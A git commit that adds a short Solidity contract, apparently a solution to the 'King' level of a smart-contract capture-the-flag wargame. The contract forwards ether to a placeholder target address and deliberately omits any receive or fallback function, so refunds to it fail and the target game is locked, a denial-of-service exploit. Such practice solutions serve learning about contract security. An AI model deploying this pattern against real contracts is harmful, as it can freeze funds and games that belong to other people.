dc3249da360611775ed39f503fb6fec2779aeaff
timou0911 <99255480+timou0911@users.noreply.github.com>
2023-04-11 22:31:49 +0800

    Create Attack.sol

---
+++ 9. King ★★★☆☆/Attack.sol
@@ -0,0 +1,15 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+contract Attack {
+
+    address payable target = payable("Instance address");
+
+    function attack() payable public {
+        (bool success, ) = target.call{value: msg.value}("");
+        require(success, "tx failed");
+    }
+    
+    // NO fallback() or receive() implemented
+}
